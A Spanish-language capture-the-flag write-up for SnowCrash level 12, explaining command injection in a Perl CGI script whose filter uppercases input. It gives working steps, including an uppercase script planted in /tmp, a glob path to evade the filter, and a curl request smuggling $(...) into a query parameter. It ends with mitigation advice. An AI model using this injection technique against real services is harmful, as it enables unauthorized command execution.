# 🚩 SnowCrash Level 12: Evasión de Filtros en Perl

Este nivel presenta una vulnerabilidad de **Inyección de Comandos OS** en un script de Perl que corre como un servicio CGI en el puerto `4646`. El reto principal es superar un filtro que transforma la entrada del usuario a mayúsculas.

## 🔍 Análisis del Código (`level12.pl`)

El punto crítico se encuentra en la función `t()`, específicamente en la línea que utiliza comillas invertidas (backticks) para ejecutar un comando de sistema:

```perl
sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;    # Filtro 1: Convierte todo a MAYÚSCULAS
  $xx =~ s/\s.*//;       # Filtro 2: Elimina todo tras el primer espacio
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # Punto de Inyección
  ...
}
```

### El Desafío de los Filtros
1.  **Transformación a Mayúsculas**: Si intentamos inyectar `/tmp/script`, el script lo convertirá en `/TMP/SCRIPT`. Como Linux distingue entre mayúsculas y minúsculas, el comando fallará porque el archivo no existe.
2.  **Sin Espacios**: No podemos pasar argumentos complejos al comando inyectado porque el script corta la cadena en el primer espacio detectado.

---

## 🛠️ Metodología de Explotación

Para bypasser (evadir) el filtro de mayúsculas, aprovechamos cómo el **Shell (Bash)** expande los asteriscos (`*`). Si usamos una ruta que solo contenga mayúsculas y asteriscos, el filtro de Perl no la alterará, pero el Shell la expandirá a la ruta real en minúsculas.

### Paso 1: Crear el Script de Ataque
Creamos un script en `/tmp` con un nombre en **MAYÚSCULAS** para que el filtro no lo toque.

```bash
echo "#!/bin/sh" > /tmp/UWU
echo "getflag > /tmp/owo" >> /tmp/UWU
chmod +x /tmp/UWU
```

### Paso 2: Ejecutar la Inyección vía CURL
Utilizamos la sintaxis `$(comando)` para ejecutar nuestro script. Para la ruta, usamos `/*/UWU`. 
*   El primer `*` será expandido por el shell a `tmp`.
*   La ruta final expandida será `/tmp/UWU`.

```bash
curl 'localhost:4646?x=$(/*/UWU)'
```

---

## 🚀 Obtención de la Flag

1.  **Inyección**: Al realizar la petición GET con `curl`, el servidor web (que corre como el usuario `flag12`) ejecuta nuestro script `/tmp/UWU`.
2.  **Verificación**: Comprobamos si el comando `getflag` se ejecutó correctamente consultando nuestro archivo de salida:
    ```bash
    cat /tmp/owo
    ```

---

## 🛡️ Prevención y Mitigación

*   **Evitar Backticks**: No se deben usar comillas invertidas ni `system()` con variables que provengan directamente del usuario.
*   **Sanitización Estricta**: Si es necesario usar comandos externos, se deben emplear listas de argumentos fijas y validar que la entrada no contenga caracteres especiales del shell como `$`, `(`, `)`, `*` o `;`.
*   **APIs Nativas**: En lugar de llamar a `egrep` mediante el shell, Perl tiene funciones nativas de manejo de archivos y expresiones regulares que son seguras y mucho más eficientes.
